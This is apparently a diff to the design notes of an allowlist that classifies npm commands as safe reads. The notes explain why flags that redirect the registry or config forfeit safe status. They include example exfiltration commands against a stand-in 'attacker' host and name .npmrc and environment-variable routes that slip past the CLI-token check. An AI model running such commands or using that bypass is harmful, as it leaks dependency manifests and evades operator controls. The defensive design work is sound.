@@ -207,14 +207,23 @@ policy even though neither can write anything:
   would silently pass every one of them through to the mutating path.
   The positive shape closes all such spellings, and any future npm
   subcommand this floor has not reasoned about, in one rule; it fails
-  closed on `npm audit --audit-level high` (a separated flag value),
-  an acceptable, conservative false negative.
+  closed on any separated flag value (e.g. `npm audit --audit-level
+  high`, `npm audit --omit dev`), an acceptable, conservative false
+  negative — use the glued `--flag=value` form to stay floored.
+  Deliberately NOT blocked: `npm audit -fix` (single dash) — verified
+  npm 11.17.0 behavior is `Unknown cli config "--fix"`, report only, not
+  the mutating `fix` arm.
 
-  A `--registry`, `--userconfig`, or `--globalconfig` token anywhere in
-  an npm invocation forfeits the floor regardless of subcommand: these
-  redirect npm's registry or config lookups to an operator-unverified
-  location, so `npm audit --registry=http://attacker` would submit the
-  full dependency manifest to that host — exfiltration, not a safe read.
+  A `--registry` (including the per-scope `--@scope:registry` override),
+  `--userconfig`, or `--globalconfig` token anywhere in an npm invocation
+  forfeits the floor regardless of subcommand: these redirect npm's
+  registry or config lookups to an operator-unverified location, so
+  `npm audit --registry=http://attacker` (or the scoped
+  `--@myorg:registry=http://attacker`) would submit the full dependency
+  manifest to that host — exfiltration, not a safe read. This guard is a
+  CLI-token check only: it does not and cannot see `registry` set via
+  `.npmrc` or the `npm_config_registry` environment variable, which
+  redirect npm identically but leave no argv trace.
 
   Every other npm subcommand (`install`, `ci`, `publish`, `update`,
   `version`, ...) stays unclassified: the allowlist is positive, not a
